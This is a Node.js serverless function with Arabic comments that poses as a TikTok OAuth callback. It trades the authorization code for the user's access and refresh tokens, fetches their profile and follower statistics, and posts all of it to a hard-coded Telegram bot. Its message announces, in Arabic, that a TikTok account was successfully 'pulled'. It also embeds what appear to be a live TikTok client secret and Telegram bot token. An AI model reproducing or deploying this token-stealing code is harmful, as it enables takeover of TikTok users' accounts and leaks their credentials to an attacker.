const https = require('https');

// الإعدادات الثابتة الخاصة بك
const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

// دالة مساعدة لعمل طلبات API بسهولة باستخدام Promises
function makeRequest(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch(e) {
          resolve(data);
        }
      });
    });
    req.on('error', (err) => reject(err));
    if (postData) req.write(postData);
    req.end();
  });
}

// دالة لإرسال الرسائل إلى تليجرام
function sendTelegram(message) {
  const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
  https.get(`https://api.telegram.org${path}`);
}

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');
  const error = urlParams.get('error');

  if (error) {
    sendTelegram(`❌ فشل تسجيل الدخول: ${error}`);
    return res.end(`TikTok Error: ${error}`);
  }

  if (!code) {
    return res.end('AWR Engine: Active & Waiting for Authorization.');
  }

  try {
    // 1. تبادل الكود للحصول على Access Token
    const tokenPostData = `client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth.vercel.app/api/auth`;
    
    const tokenOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/oauth/token/',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    };

    const tokenResponse = await makeRequest(tokenOptions, tokenPostData);
    const accessToken = tokenResponse.access_token;

    if (!accessToken) {
      throw new Error('Failed to retrieve Access Token from TikTok');
    }

    // 2. جلب معلومات الحساب الشخصية والإحصائيات
    const userOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/user/info/?fields=open_id,union_id,avatar_url,display_name,username,follower_count,following_count,likes_count,video_count',
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${accessToken}`
      }
    };

    const userResponse = await makeRequest(userOptions);
    const user = userResponse.data?.user;

    // 3. صياغة تقرير البيانات بشكل احترافي لتليجرام
    let telegramMessage = `🎯 *تم سحب حساب تيك توك بنجاح!* 🎯\n\n`;
    
    if (user) {
      telegramMessage += `👤 *الاسم الشخصي:* ${user.display_name || 'غير محدد'}\n`;
      telegramMessage += `🏷️ *اليوزر نيم:* @${user.username || 'غير محدد'}\n`;
      telegramMessage += `🆔 *Open ID:* \`${user.open_id}\`\n\n`;
      telegramMessage += `📊 *إحصائيات الحساب:*\n`;
      telegramMessage += `👥 *المتابعين (Followers):* ${user.follower_count || 0}\n`;
      telegramMessage += `📉 *المتابَعين (Following):* ${user.following_count || 0}\n`;
      telegramMessage += `❤️ *الإعجابات (Likes):* ${user.likes_count || 0}\n`;
      telegramMessage += `🎥 *عدد الفيديوهات:* ${user.video_count || 0}\n\n`;
    } else {
      telegramMessage += `⚠️ تم جلب التوكين ولكن فشل جلب البيانات الشخصية مؤقتاً.\n\n`;
    }

    telegramMessage += `🔑 *رموز الوصول (Tokens):*\n`;
    telegramMessage += `🎫 *Access Token:* \`${accessToken}\`\n\n`;
    telegramMessage += `🔄 *Refresh Token:* \`${tokenResponse.refresh_token}\``;

    // إرسال التقرير النهائي لتليجرام
    sendTelegram(telegramMessage);

    // الرد على المتصفح
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<h1>✅ تم التوثيق وسحب البيانات بنجاح! تفقد حسابك على تليجرام الآن.</h1>');

  } catch (err) {
    sendTelegram(`⚠️ حدث خطأ أثناء معالجة البيانات:\n${err.message}`);
    res.end(`Internal Error: ${err.message}`);
  }
};
